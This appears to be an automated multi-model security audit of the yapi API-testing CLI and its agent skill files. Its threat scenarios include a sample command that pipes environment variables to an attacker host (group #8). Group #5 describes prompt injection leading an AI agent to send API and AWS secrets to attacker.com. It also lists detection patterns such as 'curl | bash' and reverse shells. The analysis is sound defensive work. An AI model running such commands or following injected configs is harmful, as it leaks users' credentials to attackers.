- This becomes dangerous if thresholds are used to hide meaningful test regressions. Specific risky conditions include: allowing large threshold drops, having no absolute minimum coverage floor, not enforcing patch coverage on changed lines, or allowing PRs to merge without required status checks. Under those conditions, repeated small tolerated drops can accumulate into major long-term test erosion ('coverage drift'). It is especially problematic in fast-moving repos where many PRs each consume part of the allowed drop, eventually weakening defect detection while CI still appears green.
- An attacker who has already compromised a developer's account or gained commit access to the repository might modify this file to remove coverage thresholds entirely. This would allow them to introduce malicious code without writing accompanying tests, bypassing CI/CD quality gates that might otherwise flag the un-tested code.

### Recommendations:
- [security_analyst] No action required. This file is safe and represents standard Codecov configuration practice.
- [intent_analyst] Keep the tolerance but add stricter guardrails: define an absolute minimum project coverage target, enforce patch coverage with a higher expectation for new code, require Codecov checks via branch protection, and periodically review threshold values against historical trends. If possible, reduce project threshold from 5% to a tighter value once stability improves, and document why each threshold exists so it cannot be quietly expanded without team review.
- [adversarial_analyst] Ensure branch protection rules are enabled for the repository, requiring mandatory code reviews for any changes to CI/CD configuration files, including `codecov.yml`.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard Codecov configuration file (codecov.yml) that configures code coverage thresholds for CI/CD checks. It sets a 5% tolerance for overall project coverage drops and a 2% tolerance for patch-level coverage drops before failing a pull request check. This is entirely expected and benign configuration for a Go project using Codecov for coverage reporting.

**intent_analyst** (openai/gpt-5.3-codex):
> This `codecov.yml` is configuring CI coverage gates to tolerate small decreases in test coverage: up to 5% on overall project coverage and 2% on patch (changed lines) coverage. The intent appears to be developer-friendly quality control—preventing noisy failures from minor fluctuations while still tracking coverage trends.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> From an attacker's perspective, this file is a completely benign, standard configuration for the Codecov service. It contains no executable code, network calls, or logic that could be exploited directly. The only potential 'attack' involving this file would be a malicious insider or an attacker with commit access intentionally modifying these thresholds (e.g., setting them to 100%) to allow large amounts of untested, potentially malicious code to be merged without triggering CI/CD pipeline failures. However, the file as presented is safe and standard.

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard Codecov configuration file (codecov.yml) that configures code coverage thresholds for CI/CD checks. It sets a 5% tolerance for overall project coverage drops and a 2% tolerance for 
- **intent_analyst**: LOW - This `codecov.yml` is configuring CI coverage gates to tolerate small decreases in test coverage: up to 5% on overall project coverage and 2% on patch (changed lines) coverage. The intent appears to b
- **adversarial_analyst**: SAFE - From an attacker's perspective, this file is a completely benign, standard configuration for the Codecov service. It contains no executable code, network calls, or logic that could be exploited direct

### Analysis Group #5

- **Final Severity**: LOW
- **Confidence**: 74%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This lock file is used by pnpm to ensure reproducible installs across all environments for the yapi monorepo. It pins exact versions of all dependencies for the web app, VS Code extension, and GitHub Action integration packages.
- The correct and safe use of this pattern is to commit the lockfile and treat it as the source of truth for dependency resolution in CI/CD and local development. In a pnpm workspace, using `workspace:*` and `link:` is expected for internal packages so local modules resolve consistently. Safe practice includes: (1) install with frozen lockfile in CI (`pnpm install --frozen-lockfile`), (2) review lockfile diffs in pull requests (especially new packages, postinstall scripts, and major version jumps), (3) run regular vulnerability and license scans, and (4) keep toolchain versions (Node/pnpm) aligned across developers and CI.
- Developers and AI agents use this tool to define, test, and iterate on API requests in a declarative, version-controlled manner using YAML files.

### Why this might be dangerous:
- Even though this lockfile is not malicious by itself, lockfiles are a supply-chain control point. It becomes dangerous if an attacker (or compromised dependency update) introduces a malicious package/version and the lockfile pins it, causing deterministic installation of harmful code (often via install scripts). Risk conditions include: unreviewed lockfile churn in large PRs, permissive dependency update bots without security gates, developers running install scripts from untrusted branches, or private registry misconfiguration allowing dependency confusion. In those cases, the lockfile can reliably propagate the compromised artifact to all environments.
- An attacker uses prompt injection on an AI agent (or submits a malicious PR to a human developer) to create or modify a `.yapi.yml` file. The crafted file defines an HTTP request to `https://attacker.com/exfiltrate` and includes sensitive environment variables (e.g., `${PROD_API_KEY}`, `${AWS_SECRET_ACCESS_KEY}`) in the headers or body. When the AI agent or developer runs `yapi run`, the tool legitimately resolves the variables and inadvertently transmits the secrets to the attacker.

### Recommendations:
- [security_analyst] No action required. This is a normal, benign dependency lock file with no suspicious packages or unexpected dependencies detected.
- [intent_analyst] Keep the lockfile committed and enforce strict review + automation around it: require human review for lockfile changes, use `--frozen-lockfile` in CI, enable Dependabot/Renovate with security-only auto-merge rules, run `pnpm audit` (or equivalent SCA) in CI, block suspicious lifecycle scripts where possible, and verify registry/scopes to prevent dependency confusion. If this repo is security-sensitive, add provenance/signature checks (e.g., trusted registries, checksum verification, and SBOM generation).
- [adversarial_analyst] Implement an 'allowed domains' list or require explicit confirmation when a configuration file attempts to send resolved environment variables to external or unrecognized domains. When used by AI agents, run the tool in an isolated environment with least-privilege access to sensitive environment variables.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard pnpm lock file (pnpm-lock.yaml) for a monorepo project called 'yapi', a CLI-first API testing tool. The file contains pinned dependency versions for multiple workspace packages including a Next.js web app, VS Code extension, and GitHub Action integration. All dependencies are well-known, legitimate packages from the npm ecosystem (React, Next.js, Monaco Editor, Tailwind CSS, Vite, Vitest, etc.). There are no suspicious packages, typosquatted names, or unexpected dependencies. The workspace packages (@yapi/client, @yapi/ui, @yapi/styles, etc.) are internal monorepo references using the 'link:' protocol, which is expected behavior.

**intent_analyst** (openai/gpt-5.3-codex):
> This file is a standard `pnpm-lock.yaml` for a monorepo (web app, GitHub Action integration, and VS Code integration). Its intent is to pin exact dependency resolutions for reproducible installs across environments, including workspace links (`workspace:*` / `link:`) and concrete transitive versions. There is no direct executable logic or obvious malicious pattern in the snippet itself.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The provided files describe a legitimate CLI-based API client and its dependencies. There is no inherently malicious code in the lockfile or configuration. However, from an attacker's perspective, tools that read environment variables and make arbitrary network requests based on configuration files are perfect 'confused deputies'. Because the tool is designed to be used by AI agents ('agentic API development'), it introduces a risk where prompt injection could trick the AI into exfiltrating sensitive environment variables via a crafted API request.

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard pnpm lock file (pnpm-lock.yaml) for a monorepo project called 'yapi', a CLI-first API testing tool. The file contains pinned dependency versions for multiple workspace packages incl
- **intent_analyst**: LOW - This file is a standard `pnpm-lock.yaml` for a monorepo (web app, GitHub Action integration, and VS Code integration). Its intent is to pin exact dependency resolutions for reproducible installs acros
- **adversarial_analyst**: LOW - The provided files describe a legitimate CLI-based API client and its dependencies. There is no inherently malicious code in the lockfile or configuration. However, from an attacker's perspective, too

### Analysis Group #6

- **Final Severity**: SAFE
- **Confidence**: 100%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This file is used by pnpm to manage a monorepo workspace, defining which directories contain packages and controlling which native/build dependencies are permitted to execute install scripts — a standard security practice in modern JavaScript monorepos.
- The correct/safe use of this pattern is to explicitly enumerate workspace package paths and strictly gate lifecycle/build scripts to a minimal allowlist of trusted packages that genuinely need compilation or binary setup (e.g., `esbuild`, `sharp`). `ignoredBuiltDependencies` should be used for dependencies whose install/build scripts are unnecessary in your environment (or known to be problematic), reducing attack surface and improving reproducibility. Safe operation requires: (1) periodic review of allowlisted packages, (2) pinning dependency versions via lockfiles, (3) CI enforcement so local installs and CI behave identically, and (4) documenting why each package is in `onlyBuiltDependencies` so future maintainers don’t over-broaden the list.
- This file is legitimately used to define the structure of a monorepo (telling pnpm where to find local packages) and to securely manage native dependencies by restricting which packages are allowed to execute lifecycle scripts during installation.

### Why this might be dangerous:
- This becomes dangerous if the allowlist is expanded carelessly or if trusted packages are later compromised upstream. Specific risky conditions include: (1) adding a package with powerful postinstall scripts to `onlyBuiltDependencies` without audit, enabling arbitrary code execution during install; (2) relying on broad wildcards or frequent unreviewed dependency updates, which can pull in malicious script changes; (3) suppressing build scripts (`ignoredBuiltDependencies`) for security-sensitive dependencies in ways that silently disable protections or force fallback code paths; and (4) inconsistent developer/CI environments where policy is bypassed (e.g., different pnpm versions/settings), causing unnoticed script execution. In short, the mechanism is protective, but misconfiguration or weak review can turn it into a false sense of security.
- Direct exploitation of this static configuration file is not possible without prior write access to the repository. If an attacker already compromised the repository (e.g., via stolen credentials), they could modify this file to add a malicious package to the `onlyBuiltDependencies` list, thereby allowing a malicious postinstall script to execute on developers' machines or in CI/CD pipelines. However, this is a post-compromise action rather than an initial vector.

### Recommendations:
- [security_analyst] No action required. This is a benign workspace configuration file with no security concerns.
- [intent_analyst] Keep this configuration, but add governance: enforce `pnpm install --frozen-lockfile` in CI, require code review for any change to `onlyBuiltDependencies`/`ignoredBuiltDependencies`, pin pnpm version, and run periodic supply-chain scans (`pnpm audit`, Dependabot/Renovate with approval gates). Also document each allowlisted build dependency with a justification and expected script behavior, and alert on lockfile changes that introduce new lifecycle scripts.
- [adversarial_analyst] Continue using `onlyBuiltDependencies` as a security boundary. Regularly audit the packages listed in this allowlist to ensure they are still required, trusted, and maintained.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard pnpm workspace configuration file (pnpm-workspace.yaml) that defines a monorepo structure. It specifies package locations (apps/*, packages/*, integrations/*), lists ignored built dependencies (keytar), and restricts which packages are allowed to run build scripts (esbuild, sharp, unrs-resolver, @vscode/vsce-sign). All of these are legitimate, well-known packages consistent with a VS Code extension project (vsce-sign) with a blog component (madea-blog-core) and sharp for image processing. There is nothing suspicious or unexpected here.

**intent_analyst** (openai/gpt-5.3-codex):
> This `pnpm-workspace.yaml` is configuring a monorepo package layout and tightening dependency build-script execution. The intent appears legitimate: include multiple workspace folders and control which dependencies are allowed to run native/postinstall build steps (`onlyBuiltDependencies`), while explicitly suppressing build scripts for `keytar`. This is generally a supply-chain hardening pattern, not malicious behavior.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The provided `pnpm-workspace.yaml` is a standard configuration file for a pnpm monorepo. From an attacker's perspective, this file is actually implementing a security best practice. By utilizing pnpm's `onlyBuiltDependencies` array, the repository is explicitly allowlisting which dependencies are permitted to run build or postinstall scripts (such as `esbuild` and `sharp`). This significantly reduces the attack surface against supply chain attacks, as a compromised transitive dependency would be blocked from executing malicious code during the `pnpm install` phase unless it was explicitly added to this list.

### Analysis Group #7

- **Final Severity**: SAFE
- **Confidence**: 76%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- Providing usage examples in documentation (like SKILL.md or README.md) is standard practice for CLI tools to help users and AI agents understand how to invoke the tool correctly.
- This SKILL.md serves as an AI agent skill prompt that instructs an AI assistant on how to use the yapi CLI tool for API testing. The bash code blocks are documentation examples showing legitimate CLI usage patterns like running tests against different environments (local, staging, prod). This is exactly what you'd expect in a developer tool's skill/documentation file.
- The correct/safe pattern is to use these commands for controlled API validation where test definitions are known, reviewed, and environment-specific credentials are scoped appropriately. Safe usage includes: (1) keeping `prod` test files read-only (GET/HEAD or non-mutating health checks), (2) using least-privilege production API keys, (3) separating smoke/monitor tests from integration tests that create/update/delete data, (4) requiring explicit environment selection (no accidental fallback to prod), and (5) running in CI with audited configs and secret management. In this context, `yapi run get-users.yapi.yml --env staging/prod` is a standard and useful workflow for consistency across environments.

### Why this might be dangerous:
- None. The commands are specific to the `yapi` tool (`yapi run ...`) and do not execute arbitrary code, modify system state, or perform dangerous operations.
- N/A - The bash code blocks contain only `yapi run` commands with YAML file arguments and environment flags. There are no dangerous system commands, no data exfiltration, no access to sensitive files, and no hidden instructions that could manipulate an AI agent into performing unintended actions.
- This becomes dangerous when the referenced test file performs mutating operations (POST/PATCH/DELETE), uses high-privilege credentials, or points at production systems without safeguards. Specific conditions that increase risk: `default_environment` accidentally set to `prod`; test chains that create/delete real customer data; broad API keys loaded from shell env; no tenant/sandbox isolation; and automation that runs `yapi test` or `yapi run` on merge without environment gating. Under those conditions, the same benign command pattern can trigger unintended production writes, outages, data corruption, or compliance violations—even without malicious intent. A truly malicious actor could also intentionally commit destructive `.yapi.yml` changes and rely on normal CI execution to run them against prod.

### Recommendations:
- [adversarial_analyst] Ignore the static analysis finding. To reduce false positives, consider refining the `prompt_embedded_shell` rule to look for actual dangerous commands (e.g., `rm -rf`, `curl | bash`, reverse shells, or obfuscated payloads) rather than flagging any `bash` code block.
- [security_analyst] No action required. The static analysis finding (SK-MEDI-0047) is a false positive. The flagged bash code blocks are benign documentation examples showing standard CLI usage. The low confidence score (0.65) from the static analyzer correctly reflects uncertainty. This file is safe to use as an AI agent skill prompt.
- [intent_analyst] Keep the examples, but add explicit production safety controls: (1) document that `--env prod` should be limited to non-destructive checks; (2) enforce a confirmation/guard flag for prod runs (e.g., `--yes-prod` or interactive prompt in CLI); (3) split test suites into `readonly` vs `mutating` and block mutating suites in prod; (4) require least-privilege prod tokens and separate credentials per suite; (5) add CI policy checks to reject dangerous methods against prod unless explicitly approved; and (6) include a warning in docs near `--env prod` that command safety depends on the request file contents.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The flagged code is a standard markdown code block containing benign example shell commands demonstrating how to use the `yapi` CLI tool. There are no dangerous commands, prompt injections, jailbreaks, or data exfiltration instructions present. The static analysis finding is a false positive based on a broad heuristic that flags any shell code blocks in skill prompts.

**security_analyst** (anthropic/claude-sonnet-4.6):
> The SKILL.md file is a legitimate documentation/instruction file for the yapi CLI tool, which is a YAML-based API testing client. The bash code blocks flagged by static analysis (lines 47-51) are simply documentation examples showing how to run the yapi CLI with different environment flags. These are standard usage examples expected in any CLI tool's documentation. There is no prompt injection, jailbreak backdoor, data exfiltration instruction, or hidden malicious behavior. The shell commands shown are benign invocations of the tool itself (`yapi run ...`), not dangerous system commands.

**intent_analyst** (openai/gpt-5.3-codex):
> This snippet is documentation showing normal CLI usage of `yapi run` across environments (`local`, `staging`, `prod`). The intent is clearly legitimate: demonstrate environment switching for the same API test file. There is no embedded payload, obfuscation, or command chaining typically associated with malicious shell content. The only gray-area aspect is that running tests against `--env prod` can be risky depending on what the referenced `.yapi.yml` actually does.

#### Disagreements Between Models

- **adversarial_analyst**: SAFE - The flagged code is a standard markdown code block containing benign example shell commands demonstrating how to use the `yapi` CLI tool. There are no dangerous commands, prompt injections, jailbreaks
- **security_analyst**: SAFE - The SKILL.md file is a legitimate documentation/instruction file for the yapi CLI tool, which is a YAML-based API testing client. The bash code blocks flagged by static analysis (lines 47-51) are simp
- **intent_analyst**: LOW - This snippet is documentation showing normal CLI usage of `yapi run` across environments (`local`, `staging`, `prod`). The intent is clearly legitimate: demonstrate environment switching for the same 

### Analysis Group #8

- **Final Severity**: SAFE
- **Confidence**: 75%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This file is used by Vercel's deployment platform to understand how to build and serve the yapi web application. The framework hint, build command, and output directory are all standard Vercel configuration options used in production deployments of Next.js apps.
- The safe/expected use of this pattern is to define reproducible deployment behavior for CI/CD. A custom `buildCommand` is appropriate when you need setup steps (workspace bootstrapping, dependency filtering, codegen, monorepo targeting) before Next.js build output is produced. Correct usage requires: (1) the script is version-controlled and reviewed like application code, (2) the script uses deterministic, pinned tooling (lockfiles, fixed package manager behavior), (3) build-time environment variables are minimally scoped, and (4) the output directory matches the framework build artifact. In this configuration, using `framework: nextjs` plus explicit `outputDirectory` is a common and legitimate setup for non-default project structures.
- Configuring Vercel deployment for a monorepo where the Next.js application requires custom build steps (e.g., building CLI binaries or generating assets before the Next.js build) defined in a shell script.

### Why this might be dangerous:
- This becomes dangerous if the custom shell script executes untrusted commands or pulls remote code at build time (e.g., `curl | bash`, unpinned downloads, executing user-controlled variables). Risk increases when preview deployments run on untrusted PRs/forks, because build steps may access secrets or deployment tokens. Another dangerous condition is supply-chain drift: if the script installs latest dependencies without pinning, a compromised package could execute in build context. Finally, if environment variables are broadly exposed to all branches/environments, a malicious change to `vercel-build.sh` could exfiltrate secrets through logs/network calls.
- An attacker submits a malicious Pull Request or gains unauthorized commit access to the repository. They modify `./cli/scripts/vercel-build.sh` to include commands like `env | base64 | curl -d @- https://attacker.com/exfil`. When Vercel automatically builds the PR or commit, the script executes, exfiltrating sensitive environment variables (like API keys or database credentials) to the attacker.

### Recommendations:
- [security_analyst] No action required. This is a benign, standard Vercel configuration file. If desired, one could audit the referenced build script (`./cli/scripts/vercel-build.sh`) separately to ensure it does not contain unexpected behavior, but the configuration file itself is safe.
- [intent_analyst] Keep the custom build script but harden it: enforce strict shell options (`set -euo pipefail`), avoid dynamic remote execution, pin dependencies via lockfiles, and require code-owner review for `vercel.json` and `cli/scripts/vercel-build.sh`. In Vercel, scope secrets by environment/branch, disable secret access for untrusted previews where possible, and monitor build logs/network egress for exfiltration patterns. If feasible, replace complex shell logic with audited package-manager scripts to reduce attack surface.
- [adversarial_analyst] Ensure strict access controls and branch protection rules are in place for the repository. Require code reviews for all changes, paying special attention to modifications in `./cli/scripts/vercel-build.sh` or any other build scripts. Consider using Vercel's built-in environment variable protection features to limit the exposure of secrets during preview builds.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard Vercel deployment configuration file (vercel.json) for a Next.js application. It specifies the framework, a build command pointing to a shell script, and the output directory. There is nothing suspicious or malicious here — this is exactly what a typical Vercel-hosted web application configuration looks like. The build command references a local script (`./cli/scripts/vercel-build.sh`) which is a common pattern for custom build steps in monorepo setups.

**intent_analyst** (openai/gpt-5.3-codex):
> This `vercel.json` is a standard Vercel deployment configuration for a Next.js app that uses a custom build script (`bash ./cli/scripts/vercel-build.sh`) and points Vercel to the generated output directory (`./apps/web/.next`). The intent appears legitimate: control build behavior in a monorepo/project layout rather than relying on Vercel defaults.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> The provided `vercel.json` file is a standard configuration for deploying a Next.js application to Vercel, likely structured as a monorepo given the output directory. It specifies a custom build script (`bash ./cli/scripts/vercel-build.sh`). While custom build scripts are common for complex projects, from an attacker's perspective, this script represents a critical execution context. If an attacker can compromise the repository and modify `vercel-build.sh`, they achieve arbitrary code execution within the Vercel build environment, allowing them to steal deployment secrets, environment variables, or inject malicious code into the final build artifacts. The `vercel.json` file itself is benign, but it highlights the build script as a high-value target.

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard Vercel deployment configuration file (vercel.json) for a Next.js application. It specifies the framework, a build command pointing to a shell script, and the output directory. There
- **intent_analyst**: LOW - This `vercel.json` is a standard Vercel deployment configuration for a Next.js app that uses a custom build script (`bash ./cli/scripts/vercel-build.sh`) and points Vercel to the generated output dire
- **adversarial_analyst**: SAFE - The provided `vercel.json` file is a standard configuration for deploying a Next.js application to Vercel, likely structured as a monorepo given the output directory. It specifies a custom build scrip

### Analysis Group #9

- **Final Severity**: SAFE
- **Confidence**: 77%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This action is used in CI/CD pipelines to set up the build environment for the yapi VS Code extension. It would be called by other workflow files to ensure consistent builds across different jobs or workflows.
- Setting up the build environment and compiling a VS Code extension within a GitHub Actions CI/CD pipeline.
- The correct/safe usage is exactly what this action is mostly doing: pin major versions of setup actions, install dependencies with a lockfile (`pnpm install --frozen-lockfile`), and run a deterministic build command (`pnpm build:extension`). This pattern is appropriate for trusted branches, release pipelines, and internal CI where repository content is controlled. Safe operation assumes: (1) lockfile integrity is reviewed, (2) dependency updates are controlled (e.g., Renovate/Dependabot with review), (3) secrets are not exposed to untrusted build contexts, and (4) workflow permissions are least-privilege. In short, this is a standard reproducible build pipeline for JS/TS extensions.

### Why this might be dangerous:
- An attacker with commit access to the repository could modify the `build:extension` script in `package.json` to execute malicious code during the CI run, potentially exfiltrating secrets from the GitHub Actions environment. However, this relies on pre-existing repository compromise and is not a vulnerability of this specific file.
- This becomes dangerous when untrusted code can influence `package.json`, lockfile, or scripts that run during install/build. Specific conditions: (1) PRs from forks trigger this workflow with elevated permissions or secrets; (2) a compromised dependency in the lockfile contains malicious `preinstall`/`postinstall`/build scripts; (3) `pnpm build:extension` invokes project scripts that exfiltrate environment data or tamper with artifacts; (4) broad `GITHUB_TOKEN` permissions allow write operations if malicious code executes. Even with `--frozen-lockfile`, if the lockfile itself is maliciously changed and merged (or insufficiently reviewed), CI will faithfully execute harmful scripts.

### Recommendations:
- [security_analyst] No action required. The file is safe and follows good practices. Consider pinning action versions to specific commit SHAs (e.g., pnpm/action-setup@a3252b7) instead of mutable tags for even stronger supply chain security, but this is a minor hardening suggestion, not a vulnerability.
- [adversarial_analyst] Ensure branch protection rules are in place to prevent unauthorized modifications to `package.json`, `pnpm-lock.yaml`, and workflow files. For stricter supply chain security, consider pinning the referenced GitHub Actions (`pnpm/action-setup` and `actions/setup-node`) to specific commit SHAs instead of major version tags (e.g., `@v4`).
- [intent_analyst] Keep this action, but harden CI supply-chain posture: (1) restrict workflow/job permissions (`permissions: contents: read` unless more is required), (2) avoid exposing secrets to fork PR builds, (3) require review on `package.json`, `pnpm-lock.yaml`, and workflow files, (4) consider running `pnpm install --frozen-lockfile --ignore-scripts` for jobs that do not require lifecycle scripts, or split trusted/untrusted jobs, (5) pin third-party actions to full commit SHAs instead of tags for stronger immutability, and (6) add dependency auditing/SBOM or provenance checks in CI.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard GitHub Actions composite action file that sets up the VS Code extension build environment. It installs pnpm (a package manager), sets up Node.js 22, installs dependencies using a frozen lockfile (which prevents unexpected dependency changes), and builds the extension. All steps are entirely expected for a CI/CD workflow building a VS Code extension. The use of pinned action versions (pnpm/action-setup@v4, actions/setup-node@v4) and --frozen-lockfile flag are actually good security practices.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> This is a standard GitHub Actions composite action used to set up a Node.js environment with pnpm, install dependencies, and build a VS Code extension. There are no inputs, external untrusted scripts, or dangerous configurations present. From an attacker's perspective, the only way to exploit this workflow is by compromising the repository itself (e.g., modifying `package.json` or `pnpm-lock.yaml` to include malicious dependencies or build scripts), which is a generic threat to all CI/CD pipelines rather than a flaw in this specific code.

**intent_analyst** (openai/gpt-5.3-codex):
> This composite GitHub Action is intended to set up a Node/pnpm toolchain and build the VS Code extension in CI. It performs standard, legitimate build steps: install pnpm, configure Node.js with pnpm cache, install dependencies from lockfile, and run a build script. There is no direct malicious logic, but it sits in a common CI gray area where dependency installation and build scripts execute arbitrary package lifecycle code.

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard GitHub Actions composite action file that sets up the VS Code extension build environment. It installs pnpm (a package manager), sets up Node.js 22, installs dependencies using a fr
- **adversarial_analyst**: SAFE - This is a standard GitHub Actions composite action used to set up a Node.js environment with pnpm, install dependencies, and build a VS Code extension. There are no inputs, external untrusted scripts,
- **intent_analyst**: LOW - This composite GitHub Action is intended to set up a Node/pnpm toolchain and build the VS Code extension in CI. It performs standard, legitimate build steps: install pnpm, configure Node.js with pnpm 

### Analysis Group #10

- **Final Severity**: SAFE
- **Confidence**: 78%
- **Is Malicious**: False
- **Is Gray Area**: True

#### Gray Area Analysis

## Gray Area Analysis

### Why this might be legitimate:
- This workflow is used to enforce a development policy where changes to the CLI codebase must be routed through an intermediate branch (`next`) before being merged into `main`. This is a standard branching/release strategy used in many open-source and enterprise projects.
- Enforcing branch protection rules, specifically ensuring that changes to the CLI component are staged in a 'next' branch before being merged into 'main'.
- This is a valid and common pattern for enforcing branching strategy in CI. The safe/correct usage is: (1) trigger on PRs to protected branches (here, `main`), (2) fetch enough Git history (`fetch-depth: 0`) so diff logic works reliably, (3) compute changed paths in the PR range, and (4) fail with a clear remediation message. This helps teams isolate risky subsystems (like a CLI) behind staged promotion branches. It is especially appropriate when paired with branch protection rules requiring this check to pass before merge.

### Why this might be dangerous:
- An attacker might try to create files with names containing GitHub Actions workflow commands (e.g., `::add-mask::`) inside the `cli/` directory to manipulate the runner's output parsing when `echo "$CHANGED_FILES"` is executed. However, since the workflow immediately exits with a failure status and has no downstream steps or elevated privileges, the impact of such an injection is negligible.
- This becomes dangerous mainly when treated as a complete security control rather than a policy check. Specific risky conditions: (1) if `main` allows direct pushes, users can bypass this entirely; (2) if branch protection does not require this workflow status, merges can proceed despite failure; (3) if CLI-impacting code lives outside `cli/` (shared libs, build scripts, release configs), a contributor can change CLI behavior without touching `cli/`; (4) path tricks (case differences on case-insensitive tooling, symlinked content, or repo restructures) can create blind spots; (5) operational fragility—if `origin/main...HEAD` is unavailable or unusual PR refs are used, the check may mis-evaluate. So the danger is policy bypass and false confidence, not direct code execution abuse.

### Recommendations:
- [security_analyst] No action required. This is a safe, well-scoped CI workflow with no security concerns.
- [adversarial_analyst] The code is safe. As a general best practice, consider using `printf "%s\n" "$CHANGED_FILES"` instead of `echo` to prevent any potential issues with filenames that start with hyphens (like `-e` or `-n`), though this is a minor edge case.
- [intent_analyst] Keep this workflow, but harden it: require it in branch protection for `main`; disallow direct pushes to `main`; expand path coverage to include all CLI-relevant files (or use CODEOWNERS + protected reviews for `cli/**` and dependencies); add a fallback/diagnostic step to verify diff base refs exist; and consider using `paths`/`paths-ignore` triggers plus a dedicated changed-files action for more robust path detection. Document clearly that this is a workflow policy gate, not a standalone security boundary.

**security_analyst** (anthropic/claude-sonnet-4.6):
> This is a standard GitHub Actions workflow file that enforces a branch protection policy. It checks whether any files in the `cli/` directory have been modified in a pull request targeting `main`, and fails the CI check if such changes are detected. This is a common and legitimate practice to enforce branching strategies (e.g., requiring CLI changes to go through a `next` branch before merging to `main`). The shell commands used (`git diff --name-only`) are minimal, safe, and entirely appropriate for this purpose.

**adversarial_analyst** (google/gemini-3.1-pro-preview):
> This is a standard GitHub Actions workflow designed to enforce a branching strategy. It checks if a pull request targeting the `main` branch includes changes to the `cli/` directory, and if so, fails the check, directing the contributor to target the `next` branch instead. The shell script uses safe variable expansion and standard Git commands, presenting no obvious attack vectors or malicious behavior.

**intent_analyst** (openai/gpt-5.3-codex):
> This workflow is intended as a repository governance guardrail: for pull requests targeting `main`, it checks whether any files under `cli/` changed and fails the job if so, forcing CLI-related changes to be routed through a `next` branch first. The intent is process control and release discipline, not harmful behavior.

#### Disagreements Between Models

- **security_analyst**: SAFE - This is a standard GitHub Actions workflow file that enforces a branch protection policy. It checks whether any files in the `cli/` directory have been modified in a pull request targeting `main`, and
- **adversarial_analyst**: SAFE - This is a standard GitHub Actions workflow designed to enforce a branching strategy. It checks if a pull request targeting the `main` branch includes changes to the `cli/` directory, and if so, fails 
- **intent_analyst**: LOW - This workflow is intended as a repository governance guardrail: for pull requests targeting `main`, it checks whether any files under `cli/` changed and fails the job if so, forcing CLI-related change

## Trust Chain Analysis

**Overall Trust Verdict**: ⚠️ **VERIFY_BEFORE_USE**
*yapi's sensitive operations (arbitrary HTTP requests, credential injection, shell-piped installation) are all justified by its documented purpose as an API testing client, but safe use requires verifying that install scripts perform checksum validation (ta_006), that the assert evaluator is not shell-backed (ta_005), and that env_files containing secrets are gitignored (ta_003) — none of which can be confirmed without inspecting the Go source and install scripts directly.*

yapi is a CLI-first API testing tool that sends HTTP, gRPC, GraphQL, and TCP requests to user-defined endpoints using YAML configuration files. The skill's sensitive operations are entirely justified by its documented purpose: it is an API client, so making arbitrary network requests is its core function. The critical trust dependencies are: (1) the URLs and endpoints specified in .yapi.yml files come from the user/agent and are not independently validated, (2) API keys and secrets are injected via shell environment variables or env_files, meaning their security depends on the host environment's secret management, and (3) the install scripts are fetched from yapi.run over HTTPS and piped directly to a shell, creating a supply-chain trust dependency on that domain. There are no blockchain/DeFi operations. The primary risks are prompt-injection or misconfiguration causing the agent to send requests to unintended endpoints, and credential leakage through misconfigured env_files committed to version control.

*(Trust assumptions and verification details are shown at the top of this report.)*

### Data Flow Sources

| Category | Description | Source | Required Trust | Risk |
|----------|-------------|--------|----------------|------|
| API Endpoints | Target URLs for HTTP/gRPC/GraphQL/TCP requests, defined in .yapi.yml files | `user_provided` — SKILL.md — all example .yapi.yml files use ${url} variable resolved from yapi.config.yml environments block, or hardcoded inline in the YAML file | ta_001, ta_002 | 🟠 HIGH |
| Authorization | API keys and secrets injected into request headers via ${VAR} interpolation from shell env or env_files | `env_variable` — SKILL.md — environments block shows API_KEY: ${STAGING_API_KEY} (from shell env) and env_files: [.env.prod] pattern; variable resolution order documented as shell env > vars > env_files | ta_003, ta_004 | 🟡 MEDIUM |
| User Input | Request body, headers, query parameters, and assertion expressions defined in .yapi.yml chain steps | `user_provided` — SKILL.md — chain steps allow arbitrary body, headers, and jq-style assert expressions like .token != null; data passing between steps via ${step_name.field} interpolation | ta_005 | 🟡 MEDIUM |
| API Endpoints | Install scripts fetched from yapi.run and piped directly to bash/PowerShell | `external_api_response` — README.md — curl -fsSL https://yapi.run/install/mac.sh | bash and irm https://yapi.run/install/windows.ps1 | iex | ta_006, ta_007 | 🟠 HIGH |
| Authorization | AUR SSH private key for publishing to Arch Linux User Repository | `env_variable` — .goreleaser.yaml line — private_key: '{{ .Env.AUR_SSH_KEY }}' in the aurs release block | ta_008 | 🟢 LOW |
| User Input | Environment name passed via --env flag to select which URL and credentials to use | `user_provided` — SKILL.md — yapi run get-users.yapi.yml --env prod selects the prod environment block from yapi.config.yml | ta_002 | 🟡 MEDIUM |

### Manual Verification Checklist

> Items that cannot be auto-verified — check these before deploying this skill.

#### 1. [🔴 MUST] yapi.run is owned and controlled by the legitimate yapi maintainer (jamierpond) and the install scripts at https://yapi.run/install/mac.sh do not contain unexpected commands

**How to verify:** 1. curl -fsSL https://yapi.run/install/mac.sh and read the script contents before executing. 2. Check WHOIS for yapi.run domain ownership. 3. Compare the install script's download URL against the GitHub releases page at https://github.com/jamierpond/yapi/releases to confirm it fetches from GitHub releases with checksum verification.

